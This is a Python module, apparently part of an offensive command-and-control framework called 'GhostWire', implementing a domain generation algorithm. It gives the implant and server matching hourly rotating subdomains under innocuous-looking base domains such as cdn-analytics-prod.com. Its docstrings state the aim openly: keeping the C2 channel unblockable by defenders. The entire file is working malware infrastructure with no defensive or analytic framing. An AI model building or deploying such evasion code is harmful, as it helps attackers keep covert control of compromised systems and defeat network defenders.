"""
GhostWire DGA — Domain Generation Algorithm
=============================================
Generates time-based domain names that change every hour.

Both the implant and server use the SAME seed and the SAME
time to generate the SAME domain — without ever communicating.

This makes the C2 channel nearly impossible to block because:
  - The domain changes every hour
  - Blue team doesn't know the seed, so they can't predict it
  - Blocking one domain is useless (next hour = new domain)
"""

import hashlib
import time
from datetime import datetime, timezone


class DGA:
    """
    Domain Generation Algorithm for GhostWire C2.

    Supports multiple domains:
      - Primary domain is tried first
      - Backup domains are tried if primary fails
      - Each domain gets its own DGA subdomain
    """

    def __init__(self, seed, length=12, domain="cdn-analytics-prod.com", backup_domains=None):
        """
        Args:
            seed:           Secret key shared between server and implant.
            backup_domains: List of backup domains to try if primary fails.
        """
        self.seed = seed
        self.length = length
        self.domain = domain
        self.backup_domains = backup_domains or []

    def _get_time_key(self, timestamp=None):
        """Convert current time into a string that changes every hour."""
        if timestamp is None:
            dt = datetime.now(timezone.utc)
        else:
            dt = datetime.fromtimestamp(timestamp, tz=timezone.utc)
        return dt.strftime("%Y-%m-%d-%H")

    def generate_label(self, timestamp=None, domain_index=0):
        """
        Generate the DGA subdomain label for the current hour.

        Args:
            timestamp:     Optional Unix timestamp for testing.
            domain_index:  Which domain to generate for (0=primary, 1=backup1, etc.)
                           Different domains produce different labels for extra stealth.
        """
        time_key = self._get_time_key(timestamp)

        # Include domain_index in the seed so each domain gets a different label
        # This means even if someone discovers one domain, they can't predict the others
        combined = f"{self.seed}-{time_key}-{domain_index}"

        hash_value = hashlib.sha256(combined.encode('utf-8')).hexdigest()
        label = hash_value[:self.length]

        return label

    def generate(self, timestamp=None, domain_index=0):
        """
        Generate the FULL domain name for the current hour.

        Args:
            timestamp:     Optional Unix timestamp for testing.
            domain_index:  0 = primary domain, 1 = backup1, 2 = backup2
        """
        domains = [self.domain] + self.backup_domains

        if domain_index >= len(domains):
            domain_index = 0

        label = self.generate_label(timestamp, domain_index)
        base_domain = domains[domain_index]

        return f"{label}.{base_domain}"

    def generate_all(self, timestamp=None):
        """
        Generate DGA domains for ALL configured domains (primary + backups).

        Returns a list:
          [0] = primary domain
          [1] = backup domain 1
          [2] = backup domain 2

        Example output:
          ["kx7m9p2f.cdn-analytics-prod.com",
           "b3n8q5t1.api-cloud-services.net",
           "w2r6j4h8.updates-software-sync.io"]
        """
        results = []
        for i in range(len([self.domain] + self.backup_domains)):
            results.append(self.generate(timestamp, domain_index=i))
        return results

    def generate_past_labels(self, hours_back=24, timestamp=None):
        """Generate DGA labels for the past N hours (for all domains)."""
        if timestamp is None:
            timestamp = time.time()

        labels = []
        for i in range(hours_back):
            past_timestamp = timestamp - (i * 3600)
            past_time = datetime.fromtimestamp(past_timestamp, tz=timezone.utc)

            # Generate labels for all domains
            for domain_idx in range(len([self.domain] + self.backup_domains)):
                label = self.generate_label(past_timestamp, domain_idx)
                domains = [self.domain] + self.backup_domains
                full_domain = f"{label}.{domains[domain_idx]}"
                labels.append((label, past_time.strftime("%Y-%m-%d-%H"), full_domain))

        return labels

    def generate_future_labels(self, hours_forward=24, timestamp=None):
        """Generate DGA labels for the next N hours (for all domains)."""
        if timestamp is None:
            timestamp = time.time()

        labels = []
        for i in range(hours_forward):
            future_timestamp = timestamp + (i * 3600)
            future_time = datetime.fromtimestamp(future_timestamp, tz=timezone.utc)

            for domain_idx in range(len([self.domain] + self.backup_domains)):
                label = self.generate_label(future_timestamp, domain_idx)
                domains = [self.domain] + self.backup_domains
                full_domain = f"{label}.{domains[domain_idx]}"
                labels.append((label, future_time.strftime("%Y-%m-%d-%H"), full_domain))

        return labels

    def is_valid_label(self, label, hours_back=24, timestamp=None):
        """Check if a given label was valid within the past N hours (checks ALL domains)."""
        past_labels = self.generate_past_labels(hours_back, timestamp)
        valid_labels = [lbl for lbl, _, _ in past_labels]

        return label in valid_labels

    def is_valid_domain(self, domain, hours_back=24, timestamp=None):
        """Check if a full domain (label.base) was valid within the past N hours."""
        past_labels = self.generate_past_labels(hours_back, timestamp)
        valid_domains = [full_domain for _, _, full_domain in past_labels]

        return domain in valid_domains


